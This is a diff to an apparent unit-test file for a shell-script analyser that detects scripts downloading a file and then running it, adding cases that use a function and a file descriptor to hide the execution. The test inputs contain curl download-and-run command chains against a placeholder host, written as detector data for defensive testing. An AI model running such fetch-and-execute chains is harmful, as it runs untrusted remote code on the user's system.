@@ -66,6 +66,11 @@ class TestABodyReadingTheCallsInput(unittest.TestCase):
             with self.subTest(text=text[-40:]):
                 self.assertEqual(REPORTED, marks(text))
 
+    def test_a_descriptor_the_call_opens_on_the_file(self):
+        # The kit's owntw:AV036: `f() { sh "$@"; }` ⏎ `f /dev/fd/3 3< tool` runs the download under the
+        # body's `sh`, the call's descriptor its input. CLEAN on main; truth: runs, every one.
+        self.assertEqual(REPORTED, marks("curl -fsSLo tool https://example.test/tool\nf() { sh \"$@\"; }\nf /dev/fd/3 3< tool\n"))
+
     def test_a_redirect_a_here_string_and_a_process_substitution_into_the_call(self):
         # `f < t` and the own-line body are the use reader's (#2982's hook, with the call's input); the
         # here-string and the process substitution are the substitution walk's. Truth: runs under bash and
@@ -115,9 +120,13 @@ class TestWhatReadAsItDid(unittest.TestCase):
 
     def test_nothing_is_reported_where_nothing_runs(self):
         # s9.benign: a body that only counts lines; a body whose shell reads a file of its own; a function
-        # defined after the group that calls it (no function yet: command not found). Truth: nothing.
+        # defined after the group that calls it (no function yet: command not found); a body that holds
+        # the fetch itself behind a run of the file, called once (the halves kit's `xr.*.function` rows:
+        # the body is read where it stands, in its own order, and not again at the call). Truth: nothing.
         for text in ("f() {\n  wc -l\n}\n" + PIPE + "f\n", "f() { bash -s < /dev/null; }\n" + PIPE + "f\n",
-                     PIPE + "{\nf\n}\nf() { bash -s; }\n"):
+                     PIPE + "{\nf\n}\nf() { bash -s; }\n",
+                     "f() {\nsh t\ncurl -fsSLo t https://example.test/t\n}\nf\n",
+                     "f() {\nsha256sum -c sums\nbash t\ncurl -fsSLo t https://example.test/t\n}\nf\n"):
             with self.subTest(text=text[:30]):
                 self.assertEqual(CLEAN, marks(text))
 
